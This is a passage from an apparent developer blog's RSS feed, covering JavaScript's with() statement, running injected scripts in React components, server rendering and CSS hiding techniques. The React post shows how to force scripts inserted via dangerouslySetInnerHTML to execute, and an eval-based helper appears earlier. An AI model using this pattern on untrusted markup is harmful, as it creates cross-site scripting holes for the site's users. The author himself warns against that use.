	(prevObj, _current, index) =&amp;gt; {
    	let newObject = makeComplicatedObject();
    	Object.setPrototypeOf(newObject, prevObj);
    	return newObject;
  	},
	makeComplicatedObject()
);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I then ran a benchmark between that deeply nested object and another object with the same key/value pairs, but no huge prototype chain. Each snippet of code would simply log another local variable. Since it&apos;s inside the &lt;code&gt;with()&lt;/code&gt;, however, it&apos;d be forced to first wait for those objects to be crawled. &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://jsbench.me/xplqq3b8vn/3?ref=cms.macarthur.me&quot;&gt;The results&lt;/a&gt; shouldn&apos;t be surprising. The &quot;flat&quot; version of the object was ~36% faster to search. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/12/image-18.png&quot; alt=&quot;screenshot of with() benchmark results&quot; loading=&quot;lazy&quot; width=&quot;1572&quot; height=&quot;926&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/12/image-18.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/12/image-18.png 1000w, https://cms.macarthur.me/content/images/2023/12/image-18.png 1572w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;That makes sense. It didn&apos;t make &lt;code&gt;with()&lt;/code&gt; traverse that nasty prototype chain. And I&apos;m willing to bet that 99.99% of the real-world code using &lt;code&gt;with()&lt;/code&gt; doesn&apos;t need to either.&lt;/p&gt;&lt;h3&gt;My Own &quot;Limited&quot; Version&lt;/h3&gt;&lt;p&gt;I had a fun time building my own version of a more &quot;limited&quot; &lt;code&gt;with()&lt;/code&gt;, by the way. It uses a simple &lt;code&gt;Proxy&lt;/code&gt; to make &lt;code&gt;with()&lt;/code&gt; think the object only &quot;has&quot; a property when it&apos;s one of the top-level keys:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function limitedWith(obj, cb) {
  const keys = Object.getOwnPropertyNames(obj);
  const scopedObj = new Proxy(obj, {
    has(_target, key) {
      return keys.includes(key);
    },
  });

  return eval(`
    with(scopedObj) {
      (${cb}.bind(this))();
    }
  `);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&quot;https://jsbench.me/xplqq3b8vn/4?ref=cms.macarthur.me&quot;&gt;The benchmark results&lt;/a&gt; weren&apos;t too bad either, despite using JavaScript to solve what the native code powering the engine could undoubtedly do better:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/12/image-19.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1782&quot; height=&quot;918&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/12/image-19.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/12/image-19.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/12/image-19.png 1600w, https://cms.macarthur.me/content/images/2023/12/image-19.png 1782w&quot; /&gt;&lt;figcaption&gt;benchmark comparing limitedWith() vs. with()&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;Of course, this is only one optimization on the table. I also don&apos;t hate the idea of being able to pass a target scope into &lt;code&gt;with()&lt;/code&gt;. By default, it&apos;ll search for a variable all the way up the scope chain. But if a particular value is passed, it&apos;d be limited to that scope: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;with(someObject, { scope: &apos;module&apos; }) {
	// outside of `someObject`, 
	// only the current module scope 
	// would be searched.
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&apos;m sure there are good challenges to these modifications in &amp;amp; of themselves. If you have any feedback with them or other ideas altogether, I&apos;d love to hear them.&lt;/p&gt;&lt;h2&gt;You don&apos;t know every use case. &lt;/h2&gt;&lt;p&gt;These issues aside, &quot;you&apos;ll never have a legitimate reason to use [insert tool]&quot; is one bold claim, and a difficult one to defend. And it applies to certainly to &lt;code&gt;with()&lt;/code&gt;. When people discourage its use, they&apos;re very likely thinking within a certain range of possible circumstances, and making several assumptions along the way. They might include:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;em&gt;Execution speed is of utmost importance.&lt;/em&gt;&lt;/li&gt;&lt;li&gt;&lt;em&gt;The syntax is confusing.&lt;/em&gt;&lt;/li&gt;&lt;li&gt;&lt;em&gt;It&apos;s an inefficient way to accomplish a task.&lt;/em&gt;&lt;/li&gt;&lt;li&gt;&lt;em&gt;This code will always be running on the main thread.&lt;/em&gt;&lt;/li&gt;&lt;li&gt;&lt;em&gt;... many more.&lt;/em&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Assumptions like this, by the way, are &lt;em&gt;very often accurate, &lt;/em&gt;and worth keeping loaded in your brain. But they&apos;re not accurate &lt;em&gt;all&lt;/em&gt; the time. They often neglect the particular set of trade-offs and engineer being forced to make, the purpose of the tool they&apos;re building, or other factors. &lt;/p&gt;&lt;p&gt;The best evidence for this is the fact that really good, reputable libraries written by really smart, discerning engineers &lt;strong&gt;still have &lt;code&gt;with()&lt;/code&gt; in their codebases today.&lt;/strong&gt; One of them I&apos;ve come across is &lt;a href=&quot;https://github.com/BuilderIO/partytown/blob/1ce9abc7997c5898e3da063104f2a6b1227331d7/src/lib/web-worker/worker-exec.ts?ref=cms.macarthur.me#L154&quot;&gt;partytown&lt;/a&gt;, and I&apos;m very confident other examples exist as well. It may make a head tilt in reading that, but when you dig into what libraries like this are trying to achieve, it might start to level again. &lt;/p&gt;&lt;p&gt;Partytown, for example, is rather unique because much of it doesn&apos;t ever execute within the main thread, and so it runs on a fundamentally different set of performance constraints than most other libraries do. It&apos;s arguably a special case, but at the very least, butts up against the claim that &lt;code&gt;with()&lt;/code&gt; ought to be invariably revoked. You&apos;ve got to have a &lt;em&gt;really, really&lt;/em&gt; good case to take a feature away, after all, especially when it&apos;s been a part of the language &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with?ref=cms.macarthur.me#browser_compatibility&quot;&gt;for so long&lt;/a&gt;.&lt;/p&gt;&lt;h2&gt;TL;DR&lt;/h2&gt;&lt;p&gt;Let&apos;s review all that word vomit above. &lt;/p&gt;&lt;ul&gt;&lt;li&gt;Yes, there are some unique challenges &amp;amp; risks in using &lt;code&gt;with()&lt;/code&gt; (although, they weren&apos;t as bad as they were &lt;a href=&quot;https://macarthur.me/posts/with?ref=cms.macarthur.me#comment-432&quot;&gt;&lt;a href=&quot;https://macarthur.me/posts/with?ref=cms.macarthur.me#comment-432&quot;&gt;prior to ES201&lt;/a&gt;5&lt;/a&gt;).&lt;/li&gt;&lt;li&gt;No, the recommended alternatives aren&apos;t good enough.&lt;/li&gt;&lt;li&gt;Those challenges &amp;amp; risks are often overblown anyway.&lt;/li&gt;&lt;li&gt;Still, we can probably build more responsible version to replace it.&lt;/li&gt;&lt;li&gt;You&apos;re probably not justified in universally discouraging a feature that&apos;s been around for a very long time. &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;You know there are holes in this. I&apos;m possibly making unfair assumptions of my own, or missing some key risks that deserve a place in the conversation. If that&apos;s true, drop them in the comments, find me &lt;a href=&quot;https://twitter.com/amacarthur?ref=cms.macarthur.me&quot;&gt;on X&lt;/a&gt;, or write your own scathing blog post in response.&lt;/p&gt;</content:encoded></item><item><title>Executing Dangerously Injected Scripts Inside React Components</title><link>https://macarthur.me/posts/script-tags-in-react</link><guid isPermaLink="true">https://macarthur.me/posts/script-tags-in-react</guid><pubDate>Sat, 16 Dec 2023 05:06:00 GMT</pubDate><content:encoded>&lt;p&gt;First off, I hereby declare myself not responsible for you shooting yourself in the foot after reading this. &lt;/p&gt;&lt;p&gt;I&apos;m doing something a little weird with &lt;a href=&quot;https://jamcomments.com/?ref=cms.macarthur.me&quot;&gt;JamComments&lt;/a&gt; integrations. When a site&apos;s page is built, all of the HTML, CSS and JavaScript needed for comments to function are pulled in via REST API. I like this pattern. It makes for fewer dependencies, quicker iteration on the product, and it just feels tidier. &lt;/p&gt;&lt;p&gt;For the React-based integrations (Next, Gatsby, or Remix), I&apos;m using the &lt;a href=&quot;https://react.dev/reference/react-dom/components/common?ref=cms.macarthur.me#dangerously-setting-the-inner-html&quot;&gt;&lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt;&lt;/a&gt; prop to inject all of that code content into a &lt;code&gt;&amp;lt;JamComments /&amp;gt;&lt;/code&gt; component. Using that prop is necessary because I want the code to run &lt;em&gt;as code &lt;/em&gt;when the page is rendered.&lt;/p&gt;&lt;h2&gt;The Problem: Script Tags Don&apos;t Run&lt;/h2&gt;&lt;p&gt;The injected HTML &amp;amp; CSS execute just fine this way, but not the &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tags needed for the experience to come alive. React&apos;s &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt; prop &lt;a href=&quot;https://github.com/facebook/react/blob/432b9f1d9729aaea010730d546bda89b9842eaa1/packages/react-dom-bindings/src/client/ReactDOMComponent.js?ref=cms.macarthur.me#L600&quot;&gt;relies on &lt;code&gt;innerHTML&lt;/code&gt;&lt;/a&gt;, which deliberately doesn&apos;t execute scripts for [legitimate] security reasons. It&apos;s even in bold, Christmas text within the &lt;a href=&quot;https://www.w3.org/TR/2008/WD-html5-20080610/dom.html?ref=cms.macarthur.me#innerhtml0&quot;&gt;HTML spec&lt;/a&gt;:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/11/image-4.png&quot; alt=&quot;screenshot from the HTML spec indicating script tags aren&apos;t executed by innerHTML&quot; loading=&quot;lazy&quot; width=&quot;1716&quot; height=&quot;128&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/11/image-4.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/11/image-4.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/11/image-4.png 1600w, https://cms.macarthur.me/content/images/2023/11/image-4.png 1716w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;I respect that. Security matters. But in my case, executing JamComments&apos; scripts &quot;dangerously&quot; was just an implementation hurdle by nature of integrating with React. &lt;a href=&quot;https://react.dev/reference/react-dom/components/common?ref=cms.macarthur.me#dangerously-setting-the-inner-html&quot;&gt;Their own documentation&lt;/a&gt; even makes the caveat that using it might be appropriate, as long as the injected code is coming from an &quot;extremely trusted source.&quot; I know exactly what&apos;s being injected here, so I feel like I deserve a hall pass.&lt;/p&gt;&lt;h2&gt;Executing Injected Scripts &lt;/h2&gt;&lt;p&gt;Fortunately, there&apos;s a straightforward way to make this happen if you ever need it. The TL;DR: after the component mounts, scoop up the stringified code and re-run it in a document fragment. &lt;/p&gt;&lt;p&gt;Let&apos;s build that out. Here&apos;s the shell of what we&apos;ll start with: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { useRef, useLayoutEffect } from &apos;react&apos;;

export function DangrousElement({ markup }) {
	const elRef = useRef&amp;lt;HTMLDivElement&amp;gt;();

	useLayoutEffect(() =&amp;gt; {
		// Magic goes here.
	}, []);

	return (
		&amp;lt;div 
			ref={elRef} 
			dangerouslySetInnerHTML={{ __html: markup }}
		&amp;lt;/div&amp;gt;
    );
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Reaching for &lt;code&gt;useLayoutEffect()&lt;/code&gt; is very intentional, by the way. More on that later. For now, let&apos;s continue fleshing this out with the following snippet code-as-a-string being passed to the component:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const markup = `
	&amp;lt;span&amp;gt;Dangerous markup!&amp;lt;/span&amp;gt;
    
	&amp;lt;script&amp;gt;console.log(&quot;Script has executed!&quot;);&amp;lt;/script&amp;gt;
`;

&amp;lt;DangrousElement markup={markup} /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If we do this right, we&apos;ll see that &lt;code&gt;console.log&lt;/code&gt; fire after our component mounts in our application.&lt;/p&gt;&lt;h3&gt;Make a Little Document Fragment&lt;/h3&gt;&lt;p&gt;If we wanted, we &lt;em&gt;could&lt;/em&gt; query that &lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt; for the &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tags ourselves, build clones of them, and then execute them by appending them to an existing DOM node. But there&apos;s a cleaner way to pull this off: a &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/DocumentFragment?ref=cms.macarthur.me&quot;&gt;document fragment&lt;/a&gt;, or a little version of an HTML document we can use to contain (and execute) code. &lt;/p&gt;&lt;p&gt;We&apos;re going to reach for a specific piece of that API. First, we&apos;ll create a document &quot;range&quot; to hold our fragment. Think of this as a slice of the document we&apos;ll use to &quot;hold&quot; everything. After that, we&apos;ll set the context of that range to the specific DOM node we&apos;re building the component around, and finally, create the fragment. Here&apos;s what we&apos;ll put into that &lt;code&gt;useLayoutEffect()&lt;/code&gt; hook:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// Create a range/slice of the document. 
const range = document.createRange();

// Set the context to our containing node. 
range.selectNode(elRef.current);

// Create a new fragment within that range. 
const documentFragment = range.createContextualFragment(markup);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The benefit to this approach is that the code will execute &lt;em&gt;in the context of that node&lt;/em&gt;. We can verify this by creating a couple of empty ranges. First, we&apos;ll make one with no &quot;selected&quot; node. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const openRange = document.createRange();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When we access the children of the &lt;code&gt;startContainer&lt;/code&gt; property, it&apos;s wrapped around the entire document itself: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/11/image-8.png&quot; alt=&quot;openRange has context of entire document&quot; loading=&quot;lazy&quot; width=&quot;1150&quot; height=&quot;222&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/11/image-8.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/11/image-8.png 1000w, https://cms.macarthur.me/content/images/2023/11/image-8.png 1150w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;But that changes if we target a specific node: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const contextualRange = document.createRange();
contextualRange.selectNode(document.getElementById(&quot;app&quot;));&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This time, the range is wrapped around the node we selected, giving it a little more specific context:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/11/image-7.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1272&quot; height=&quot;222&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/11/image-7.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/11/image-7.png 1000w, https://cms.macarthur.me/content/images/2023/11/image-7.png 1272w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Depending on the script you&apos;re running, this might not make for anything practically meaningful, but it&apos;s nice to know that the code will run as if it were always in that spot, and maybe prevent some unexpected context-related bugs at the same time.&lt;/p&gt;&lt;h3&gt;Re-Run the Code&lt;/h3&gt;&lt;p&gt;The last part&apos;s simple. Wipe the already-rendered code and replace it with our fragment:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { useRef, useLayoutEffect } from &apos;react&apos;;

export function DangrousElement({ markup }) {
	const elRef = useRef&amp;lt;HTMLDivElement&amp;gt;();

	useLayoutEffect(() =&amp;gt; {
		const range = document.createRange();
		range.selectNode(elRef.current);
		const documentFragment = range.createContextualFragment(markup);
        
+		// Inject the markup, triggering a re-run! 
+		elRef.current.innerHTML = &apos;&apos;;
+		elRef.current.append(documentFragment);
	}, []);

	return (
		&amp;lt;div 
			ref={elRef} 
			dangerouslySetInnerHTML={{ __html: markup }}
		&amp;lt;/div&amp;gt;
    );
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, we can see that script execute like desired: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/11/image-9.png&quot; alt=&quot;screenshot showing console contains log&quot; loading=&quot;lazy&quot; width=&quot;914&quot; height=&quot;588&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/11/image-9.png 600w, https://cms.macarthur.me/content/images/2023/11/image-9.png 914w&quot; /&gt;&lt;/figure&gt;&lt;h3&gt;Reaching for &lt;code&gt;useLayoutEffect()&lt;/code&gt; vs &lt;code&gt;useEffect()&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;It&apos;s uncommon to see, but choosing &lt;code&gt;useLayoutEffect()&lt;/code&gt; here is important. This hook fires &lt;a href=&quot;https://macarthur.me/posts/when-i-needed-uselayouteffect-in-react?ref=cms.macarthur.me&quot;&gt;&lt;em&gt;before&lt;/em&gt; the component has a chance to be rendered&lt;/a&gt; (and painted) to the screen. This differs from &lt;code&gt;useEffect()&lt;/code&gt;, which runs &lt;em&gt;after&lt;/em&gt; render. If we want our code to execute as if it were there from the beginning, our work needs to come before any possible paint, which could cause an unwelcome &quot;flicker&quot; for scripts that mess with the DOM. To satisfy your curiosity, here&apos;s a modified version of the code string:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const markup = `
	&amp;lt;span id=&quot;message&quot;&amp;gt;First!&amp;lt;/span&amp;gt;
  
	&amp;lt;script&amp;gt;
		synchronousWait(1500);

		document.getElementById(&quot;message&quot;).innerText = &quot;Second!&quot;;
	&amp;lt;/script&amp;gt;
`;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&apos;ve made a &lt;code&gt;synchronousWait()&lt;/code&gt; method that blocks the main thread for 1.5 seconds. After that, the text is updated in the injected &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt;. Because React gives the component a chance to do an initial render + paint with our code, mounting it allows us to see the initial text before it&apos;s swapped out. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/11/effect-flash.gif&quot; alt=&quot;GIF showing flash caused by useEffect()&quot; loading=&quot;lazy&quot; width=&quot;1194&quot; height=&quot;476&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/11/effect-flash.gif 600w, https://cms.macarthur.me/content/images/size/w1000/2023/11/effect-flash.gif 1000w, https://cms.macarthur.me/content/images/2023/11/effect-flash.gif 1194w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Replacing that with &lt;code&gt;useLayoutEffect()&lt;/code&gt; guarantees execution before paint, preventing this flash. Instead, you just get a blank, 1.5s delay – just like you&apos;d get if the snippet were to run in a fresh HTML document. &lt;/p&gt;&lt;p&gt;The trade-off should be obvious, though: because the hook executes synchronously, you&apos;re at risk for introducing some annoying performance issues. So, be wary about what the injected script is doing, and be sure to lean into asynchronous patterns as needed.&lt;/p&gt;&lt;h3&gt;By the Way! &quot;Strict&quot; Mode Disabled for Simplicity&lt;/h3&gt;&lt;p&gt;You&apos;ll notice our log fired once, which is what&apos;d we&apos;d expect in a production environment. But with React&apos;s strict mode enabled, &lt;code&gt;useLayoutEffect()&lt;/code&gt; &lt;a href=&quot;https://github.com/facebook/react/issues/24502?ref=cms.macarthur.me&quot;&gt;will fire twice&lt;/a&gt; in development mode, meaning our log would also fire twice unless extra steps are made to avoid it. I&apos;ve intentionally disabled strict mode here, just for the sake of conceptual simplicity. &lt;/p&gt;&lt;p&gt;If you&apos;d like to see a version that works regardless of strict mode, you can see the &lt;a href=&quot;https://stackblitz.com/edit/stackblitz-starters-wd1tmd?description=React+++TypeScript+starter+project&amp;amp;file=src%2FApp.tsx%2Csrc%2Findex.tsx%2Cpublic%2Findex.html&amp;amp;title=React+Starter&amp;amp;ref=cms.macarthur.me&quot;&gt;StackBlitz environment here&lt;/a&gt;. It&apos;s not much – just another &lt;code&gt;useRef()&lt;/code&gt; hook and some value setting/getting.&lt;/p&gt;&lt;h2&gt;Don&apos;t Be Stupid&lt;/h2&gt;&lt;p&gt;I think the &lt;code&gt;dangerouslySetInnerHTML&lt;/code&gt; is appropriately named, even if it doesn&apos;t execute &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tags by default. So, I highly advise you to use it with even more caution if you do so in such a way described here. Despite that risk, I think knowing how to navigate around &quot;limitations&quot; like this, for the right reasons, is valuable, and even powerful. Just don&apos;t be an idiot when wielding it. We don&apos;t need another &lt;a href=&quot;https://en.wikipedia.org/wiki/Samy_(computer_worm)?ref=cms.macarthur.me&quot;&gt;Samy&lt;/a&gt;. &lt;/p&gt;</content:encoded></item><item><title>&quot;Server-rendering your UI is expensive!&quot;</title><link>https://macarthur.me/posts/expensive-rendering</link><guid isPermaLink="true">https://macarthur.me/posts/expensive-rendering</guid><pubDate>Fri, 15 Dec 2023 04:40:18 GMT</pubDate><content:encoded>&lt;p&gt;Whenever people are duking it out over where UI should be rendered (server vs. client), compute cost inevitably comes up.&lt;/p&gt;&lt;p&gt;“Rendering UI on the server is costly and wasteful,” client-side rendering advocates say.&lt;/p&gt;&lt;p&gt;I’ve heard that claim a lot, but I’ve not seen much to make me believe it matters. Is server rendering &lt;em&gt;really&lt;/em&gt; so jarringly expensive that it’s pummeling your bottom line, or is it a negligible blip?&lt;/p&gt;&lt;p&gt;And more importantly, has that cost been weighed against the benefits to user experience on the other side? Particularly for those with low-end Android phones and a slow network connection in nowhere Alabama?&lt;/p&gt;&lt;p&gt;“It’s expensive” is meaningless without reference and context. My compute cost may jump by $100/month, but I’ll gladly pay if it means my conversion or retention rate explodes due to better front-end performance.&lt;/p&gt;&lt;p&gt;The trade-off might not even come out to be worth it, but that’s gotta be determined with more numbers and fewer axioms. &lt;/p&gt;</content:encoded></item><item><title>You should still look at your site with JavaScript disabled.</title><link>https://macarthur.me/posts/disable-javascript</link><guid isPermaLink="true">https://macarthur.me/posts/disable-javascript</guid><pubDate>Mon, 11 Dec 2023 06:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Even today, it’s still worth looking at your sites with JavaScript disabled.&lt;br /&gt;&lt;br /&gt;Many of them have either a couple of elements that depend on JS to show/hire correctly, or a big chunk of the page rendered as a single-page application.&lt;br /&gt;&lt;br /&gt;In either case, the user interface isn’t “ready” after page load until JS has a chance to download, parse, and execute, which means core web vitals like largest contentful paint and cumulative layout shift are at risk. For your users, it means a flash of jank when they visit the page.&lt;br /&gt;&lt;br /&gt;Some of the fixes for this are simple (ex: use CSS to hide elements that should be invisible by default), and others might get a little crazier (ex. prerender an embedded SPA into part of a page).&lt;br /&gt;&lt;br /&gt;Fortunately, this stuff is easy to diagnose. Disable JavaScript, load the page, and see what’s ugly.&lt;/p&gt;</content:encoded></item><item><title>Strive for Being &quot;Feature-Complete&quot;</title><link>https://macarthur.me/posts/feature-complete</link><guid isPermaLink="true">https://macarthur.me/posts/feature-complete</guid><pubDate>Fri, 08 Dec 2023 04:44:00 GMT</pubDate><content:encoded>&lt;p&gt;If you own a software package or library, resist the pressure to eternally “improve” or “make it more flexible” it by adding features.&lt;br /&gt;&lt;br /&gt;Despite what they say, choosing to limit an an API is not the same as abandoning or ceasing to maintain it.&lt;br /&gt;&lt;br /&gt;It’s a worthy goal for a project to reach the state of being feature-complete, and I’d like to see more maintainers willing to make that decision.&lt;br /&gt;&lt;br /&gt;You’ve solved a problem. The worst thing you could do now is bloat it with features, threaten its stability, and spoil the clarity you’ve built around it.&lt;/p&gt;</content:encoded></item><item><title>There Are a Lot of Ways to Hide Stuff in the Browser</title><link>https://macarthur.me/posts/hide-stuff-in-the-browser</link><guid isPermaLink="true">https://macarthur.me/posts/hide-stuff-in-the-browser</guid><pubDate>Mon, 04 Dec 2023 13:32:24 GMT</pubDate><content:encoded>&lt;p&gt;I stumbled across a pull request in Marc Grabanski&apos;s &lt;a href=&quot;https://github.com/1Marc/modern-todomvc-vanillajs?ref=cms.macarthur.me&quot;&gt;&lt;a href=&quot;https://github.com/1Marc/modern-todomvc-vanillajs/pull/26?ref=cms.macarthur.me&quot;&gt;modern-todomvc-vanillajs&lt;/a&gt;&lt;/a&gt; from some time ago, where I was first introduced to the &lt;code&gt;hidden&lt;/code&gt; DOM attribute. It&apos;s a simple way to hide something on a page that &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/hidden?ref=cms.macarthur.me&quot;&gt;shouldn&apos;t be seen&lt;/a&gt; in any presentation, It&apos;s been around forever, and I had no idea it existed.&lt;/p&gt;&lt;p&gt;I took a quick mental inventory before thinking: &quot;wow, there are a lot of ways to hide stuff in the browser.&quot; And after a little investigation, they all seem have to have some really important trade-offs, strengths, and purposes. &lt;/p&gt;&lt;p&gt;I knew I&apos;d benefit from doing an overview of the big ones, so that&apos;s what&apos;s happening here. We&apos;re reviewing some of the most common tools designed to hide things in the browser.&lt;/p&gt;&lt;h2&gt;#1: display: none;&lt;/h2&gt;&lt;p&gt;You&apos;ve seen this one a lot – it&apos;s a classic. When applied to an element, it&apos;ll completely remove it from the flow of the document. You won&apos;t be able to see it, and it&apos;ll cease to take up any space on the page.&lt;/p&gt;&lt;p&gt;Here&apos;s a simple grid with three 1:1 blocks: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/12/image-9.png&quot; alt=&quot;three boxes next to each other&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;827&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/12/image-9.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/12/image-9.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/12/image-9.png 1600w, https://cms.macarthur.me/content/images/2023/12/image-9.png 2142w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;When we throw &lt;code&gt;display: none&lt;/code&gt; on the second list item, the third box folds in as if it were never there: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/12/image-11.png&quot; alt=&quot;second item is removed from layout&quot; loading=&quot;lazy&quot; width=&quot;1932&quot; height=&quot;844&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/12/image-11.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/12/image-11.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/12/image-11.png 1600w, https://cms.macarthur.me/content/images/2023/12/image-11.png 1932w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;From an accessibility standpoint, hiding an element like this entirely &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/CSS/display?ref=cms.macarthur.me#accessibility_concerns&quot;&gt;removes it from the accessibility tree&lt;/a&gt;, meaning tools like screen readers won&apos;t be able to access it anymore either, and it won&apos;t be focusable or findable.&lt;/p&gt;&lt;p&gt;Worth noting, the rendering state of that element &lt;strong&gt;is not cached, &lt;/strong&gt;which can have performance implications. More on that in a bit. &lt;/p&gt;&lt;h2&gt;#2: opacity: 0;&lt;/h2&gt;&lt;p&gt;Here&apos;s another common one. When you reduce the opacity of an element to nothing, it&apos;s visually hidden, but it still exists in the document flow, and it&apos;s still focusable &amp;amp; accessible to screen readers. &lt;/p&gt;&lt;p&gt;You can see this when the second box has its opacity removed. It&apos;s not visible, but still gets focus when tabbing through (see the bold text below the boxes):&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/12/opacity-focus.gif&quot; alt=&quot;second item is still focusable even when there&apos;s no opacity&quot; loading=&quot;lazy&quot; width=&quot;818&quot; height=&quot;516&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/12/opacity-focus.gif 600w, https://cms.macarthur.me/content/images/2023/12/opacity-focus.gif 818w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Using &lt;code&gt;opacity&lt;/code&gt; also has the added benefit of being easy to directly animate – something the &lt;code&gt;display&lt;/code&gt; property lacks, making it common to use in hover effects.&lt;/p&gt;&lt;h2&gt;#3: visibility: hidden;&lt;/h2&gt;&lt;p&gt;Using &lt;code&gt;visibility: hidden&lt;/code&gt; is very similar to turning off an element&apos;s opacity, except &lt;em&gt;the contents are no longer focusable or otherwise accessible&lt;/em&gt;. Here&apos;s the same set of boxes, but this time, the second item is hidden with &lt;code&gt;visibility: hidden&lt;/code&gt;. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/12/visibility-focus.gif&quot; alt=&quot;the second item is no longer focusable with &apos;visibility: hidden&apos;&quot; loading=&quot;lazy&quot; width=&quot;818&quot; height=&quot;516&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/12/visibility-focus.gif 600w, https://cms.macarthur.me/content/images/2023/12/visibility-focus.gif 818w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;As you can see, the hidden box is no longer focusable. It&apos;s skipped over completely. You won&apos;t be able to use the browser&apos;s search functionality to find it either.&lt;/p&gt;&lt;h2&gt;#4: content-visibility: hidden;&lt;/h2&gt;&lt;p&gt;Here&apos;s a newer one that&apos;s a big more interesting. It &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/CSS/content-visibility?ref=cms.macarthur.me#browser_compatibility&quot;&gt;still lacks full browser support&lt;/a&gt;, but is largely intended as a tool for improving rendering performance. There was a lot of buzz around using &lt;code&gt;content-visibility: auto&lt;/code&gt; for &lt;a href=&quot;https://web.dev/articles/content-visibility?ref=cms.macarthur.me&quot;&gt;improving the performance&lt;/a&gt; of long, content-heavy pages a couple years ago, but it can also be used to completely hide things declaratively.&lt;/p&gt;&lt;p&gt;Using &lt;code&gt;content-visiblity: hidden&lt;/code&gt; on an element won&apos;t hide it entirely, but only its &lt;em&gt;contents&lt;/em&gt;. In many cases, the result seems largely identical to using &lt;code&gt;display: none&lt;/code&gt;, but there&apos;s a key advantage: &lt;em&gt;the element&apos;s rendering state is cached&lt;/em&gt; even when it&apos;s not visible. This makes it a great choice for optimizing the rendering performance of toggled elements (settings menus, modals, 